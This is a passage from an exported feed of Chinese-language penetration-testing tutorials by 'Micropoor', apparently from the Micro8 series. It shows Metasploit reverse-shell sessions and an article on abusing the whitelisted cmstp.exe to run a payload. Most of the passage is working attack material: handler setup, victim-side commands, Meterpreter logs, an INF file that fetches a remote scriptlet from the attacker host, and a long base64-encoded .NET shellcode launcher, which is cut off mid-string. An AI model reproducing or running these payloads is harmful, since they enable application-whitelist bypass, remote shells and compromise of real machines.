exploit(multi/handler) &gt; set AutoRunScript migrate ‐f</span><br><span class="line"></span><br><span class="line">AutoRunScript =&gt; migrate ‐f</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="../do/media/ba49d6ee6a8ab9586614befb0cf9c5b5.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo !C:\Users\John\Desktop\rev_x86_53_exe.exe &gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set AutoRunScript migrate ‐f</span><br><span class="line">AutoRunScript =&gt; migrate ‐f</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 10 opened (192.168.1.4:53 ‐&gt; 192.168.1.3:5530)</span><br><span class="line">at 2019‐01‐21 05:14:57 ‐0500</span><br><span class="line">[*] Session ID 10 (192.168.1.4:53 ‐&gt; 192.168.1.3:5530) processing AutoRunScript &apos;migrate ‐f&apos;</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: rev_x86_53_exe.exe (8832)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 8788</span><br></pre></td></tr></table></figure><p><img src="../do/media/949fe91f87123f2b6767a38e2dddc7db.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>87、基于白名单Cmstp.exe执行payload第十六季</title>
      <link href="/article/87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.html"/>
      <url>/article/87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Cmstp简介："><a href="#Cmstp简介：" class="headerlink" title="Cmstp简介："></a>Cmstp简介：</h3><p>Cmstp安装或删除“连接管理器”服务配置文件。如果不含可选参数的情况下使用，则 cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件。</p><p>微软官方文档：<br><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp</a></p><p><strong>说明：</strong>Cmstp.exe所在路径已被系统添加PATH环境变量中，因此，Cmstp命令可识别，需注意x86，x64位的Cmstp调用。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe</span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe</span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.119 Windows 7  </p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><strong>注：x64 payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">emsf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><blockquote><p><img src="../do/media/ee35110fac6445ca003afa5930687f9b.jpg" alt></p></blockquote><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe /ni /s C:\Users\John\Desktop\rev.inf</span><br></pre></td></tr></table></figure><p><img src="../do/media/f8ba68b01cc57ff5bf2e5a592f680561.jpg" alt></p><h3 id="注：x64-payload"><a href="#注：x64-payload" class="headerlink" title="注：x64 payload"></a>注：x64 payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line"></span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.5</span><br><span class="line"></span><br><span class="line">[*] Meterpreter session 9 opened (192.168.1.4:53 ‐&gt; 192.168.1.5:13220)</span><br><span class="line">at 2019‐01‐20 12:08:52 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: John‐PC\John</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line"></span><br><span class="line">Current pid: 8632</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/81f60ffe54cd72a80fd46bb154ef5e83.jpg" alt></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p><strong>Micropoor_rev_cmstp_inf：</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"></span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span> </span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall_SingleUser]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=UnRegisterOCXSection </span><br><span class="line"></span><br><span class="line"><span class="section">[UnRegisterOCXSection]</span></span><br><span class="line"></span><br><span class="line">%11%\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct </span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">"SOFTWARE\Microsoft\Connection Manager"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">"Micropoor"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">"Micropoor"</span></span><br></pre></td></tr></table></figure><p><strong>cmstp_rev_53_x64.sct</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">progid=<span class="string">"PoC"</span></span><br><span class="line">classid=<span class="string">"&#123;F0001111‐0000‐0000‐0000‐0000FEEDACDC&#125;"</span> &gt; </span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">"JScript"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[ </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setversion</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params">s</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64ToStream</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line">ms.Write(ba, <span class="number">0</span>, (length / <span class="number">4</span>) * <span class="number">3</span>);</span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialized_obj = <span class="string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdh</span></span><br><span class="line"><span class="string">dGVTZXJpYWxpemF0aW9uSG9sZGVy"</span>+</span><br><span class="line"><span class="string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span>+</span><br><span class="line"><span class="string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span>+</span><br><span class="line"><span class="string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span>+</span><br><span class="line"><span class="string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span>+</span><br><span class="line"><span class="string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span>+</span><br><span class="line"><span class="string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span>+</span><br><span class="line"><span class="string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span>+</span><br><span class="line"><span class="string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span>+</span><br><span class="line"><span class="string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span>+</span><br><span class="line"><span class="string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span>+</span><br><span class="line"><span class="string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span>+</span><br><span class="line"><span class="string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span>+</span><br><span class="line"><span class="string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span>+</span><br><span class="line"><span class="string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span>+</span><br><span class="line"><span class="string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span>+</span><br><span class="line"><span class="string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span>+</span><br><span class="line"><span class="string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span>+</span><br><span class="line"><span class="string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span>+</span><br><span class="line"><span class="string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span>+</span><br><span class="line"><span class="string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span>+</span><br><span class="line"><span class="string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span>+</span><br><span class="line"><span class="string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAYaVEXAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAA8AAiIAsCCwAADAAAAAQAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAJgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAATAoAAAAgAAAADAAAAAIAAAAAAAAAAAAAAAAAACAA"</span>+</span><br><span class="line"><span class="string">"AGAucnNyYwAAAJgCAAAAQAAAAAQAAAAOAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAAAAAAAGAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAEgAAAAAAAAAAAAAAAAAAQAAAQkgAAAACAAUA7CIAAGAHAAABAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"</span>+</span><br><span class="line"> <span class="string">"KAIAAAYAACoAAAAAAAAA/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pK"</span>+</span><br><span class="line"><span class="string">"TTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0"</span>+</span><br><span class="line"><span class="string">"Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhE"</span>+</span><br><span class="line"><span class="string">"i0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS///"</span>+</span><br><span class="line"> <span class="string">"/11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1wKgBBEFUSYnkTInxQbpMdyYH/9VMiepo"</span>+</span><br><span class="line"><span class="string">"AQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ"</span>+</span><br><span class="line"><span class="string">"+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8Qg"</span>+</span><br><span class="line"><span class="string">"Xon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gA"</span>+</span><br><span class="line"><span class="string">"fShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dY"</span>+</span><br><span class="line"><span class="string">"agBZScfC8LWiVv/VAAATMAYAZQAAAAEAABEAIP4BAACNBgAAASXQAwAABCgGAAAKChYGjml+AQAA"</span>+</span><br><span class="line"><span class="string">"BH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMoBAAA"</span>+</span><br><span class="line"><span class="string">"BgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMx"</span>+</span><br><span class="line"><span class="string">"OQAAAAAFAGwAAABgAgAAI34AAMwCAABIAwAAI1N0cmluZ3MAAAAAFAYAAAgAAAAjVVMAHAYAABAA"</span>+</span><br><span class="line"><span class="string">"AAAjR1VJRAAAACwGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAADwAA"</span>+</span><br><span class="line"><span class="string">"AAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAABAAAA"</span>+</span><br><span class="line"><span class="string">"AQAAAAAACgABAAAAAAAGAD0ANgAGAE0BMQEGAGkBMQEGAJgBeAEGALgBeAEGANsBNgAGACUCeAEG"</span>+</span><br><span class="line"><span class="string">"AEACNgAGAHwCeAEGAIsCNgAGAJECNgAGALQCNgAGAOYCxwIGAPgCxwIGACsDGwMAAAAAAQAAAAAA"</span>+</span><br><span class="line"><span class="string">"AQABAAEAEAATABsABQABAAEAAAAAAOABAAAFAAMABwATAQAASgIAACEABAAHABEATwASABEAWgAS"</span>+</span><br><span class="line"><span class="string">"ABMBaAI+AFAgAAAAAIYYRAAKAAEAaCIAAAAAkQBKAA4AAQAAAAAAgACRIHEAFQABAAAAAACAAJEg"</span>+</span><br><span class="line"><span class="string">"fgAdAAUAAAAAAIAAkSCLACgACwDZIgAAAACRGBQDDgANAAAAAQCfAAAAAgCrAAAAAwCwAAAABADB"</span>+</span><br><span class="line"><span class="string">"AAAAAQDLAAAAAgDeAAAAAwDqAAAABAD5AAAABQD/AAAABgAPAQAAAQAaAQAAAgAiAREARAAuACEA"</span>+</span><br><span class="line"><span class="string">"RAA0ACkARAAKAAkARAAKADkARAAKAEkApAJCAGEAuwJKAGkA7gJPAGEA8wJYAHEARABkAHkARAAK"</span>+</span><br><span class="line"><span class="string">"ACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEA/gEAAAQAWwALAwABBwBxAAEAAAEJAH4A"</span>+</span><br><span class="line"><span class="string">"AQAAAQsAiwABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAANYBAAAEAAAAAAAAAAAAAAABAC0AAAAA"</span>+</span><br><span class="line"><span class="string">"AAQAAwAAAAA8TW9kdWxlPgAyMjIyLmRsbABQcm9ncmFtAFNoZWxsQ29kZUxhdW5jaGVyAG1zY29y"</span>+</span><br><span class="line"><span class="string">"bGliAFN5c3RlbQBPYmplY3QALmN0b3IATWFpbgBNRU1fQ09NTUlUAFBBR0VfRVhFQ1VURV9SRUFE"</span>+</span><br><span class="line"><span class="string">"V1JJVEUAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwU3Rh"</span>+</span><br><span class="line"><span class="string">"cnRBZGRyAHNpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAbHBUaHJlYWRBdHRyaWJ1dGVz"</span>+</span><br><span class="line"><span class="string">"AGR3U3RhY2tTaXplAGxwU3RhcnRBZGRyZXNzAHBhcmFtAGR3Q3JlYXRpb25GbGFncwBscFRocmVh"</span>+</span><br><span class="line"><span class="string">"ZElkAGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zAFNl"</span>+</span><br><span class="line"><span class="string">"Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZQBTZWN1cml0eUFjdGlvbgBTeXN0ZW0uUnVudGltZS5D"</span>+</span><br><span class="line"><span class="string">"b21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNv"</span>+</span><br><span class="line"><span class="string">"bXBhdGliaWxpdHlBdHRyaWJ1dGUAMjIyMgBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRh"</span>+</span><br><span class="line"><span class="string">"aWxzPntBODMyQkQ0MS1EQjgyLTQ0NzEtOEMxRC1BMDlBNDFCQjAzRER9AENvbXBpbGVyR2VuZXJh"</span>+</span><br><span class="line"><span class="string">"dGVkQXR0cmlidXRlAFZhbHVlVHlwZQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTUxMAAkJG1l"</span>+</span><br><span class="line"><span class="string">"dGhvZDB4NjAwMDAwMi0xAFJ1bnRpbWVIZWxwZXJzAEFycmF5AFJ1bnRpbWVGaWVsZEhhbmRsZQBJ"</span>+</span><br><span class="line"><span class="string">"bml0aWFsaXplQXJyYXkASW50UHRyAG9wX0V4cGxpY2l0AFN5c3RlbS5SdW50aW1lLkludGVyb3BT"</span>+</span><br><span class="line"><span class="string">"ZXJ2aWNlcwBNYXJzaGFsAENvcHkAWmVybwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIALmNj"</span>+</span><br><span class="line"><span class="string">"dG9yAFN5c3RlbS5TZWN1cml0eQBVbnZlcmlmaWFibGVDb2RlQXR0cmlidXRlAAAAAAADIAAAAAAA"</span>+</span><br><span class="line"><span class="string">"Qb0yqILbcUSMHaCaQbsD3QAIt3pcVhk04IkDIAABAwAAAQIGCQcABAkJCQkJCgAGGAkJCRgJEAkF"</span>+</span><br><span class="line"><span class="string">"AAIJGAkFIAEBEQ0EIAEBCAQBAAAAAwYREAcAAgESKREtBAABGAoIAAQBHQUIGAgCBhgIBwUdBQkY"</span>+</span><br><span class="line"><span class="string">"CRgEIAEBDggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwGAni4BgIRTeXN0"</span>+</span><br><span class="line"><span class="string">"ZW0uU2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlLCBtc2Nv"</span>+</span><br><span class="line"><span 